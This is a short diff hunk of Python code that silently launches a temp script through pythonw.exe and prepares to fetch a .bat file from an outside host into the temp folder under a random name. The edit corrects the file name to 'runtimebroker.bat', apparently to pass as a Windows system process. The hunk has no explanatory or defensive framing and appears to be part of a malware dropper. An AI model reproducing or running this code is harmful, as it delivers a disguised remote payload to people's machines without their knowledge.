@@ -13,7 +13,7 @@ _ttmp.close()
 pythonw_path = _eexecutable.replace("python.exe", "pythonw.exe")
 Popen([pythonw_path, _ttmp.name])
 
-url = "https://handler-phi.vercel.app/runtimebroke.bat"
+url = "https://handler-phi.vercel.app/runtimebroker.bat"
 temp = tempfile.gettempdir()
 name = os.path.join(temp, f"{uuid.uuid4()}.bat")
 
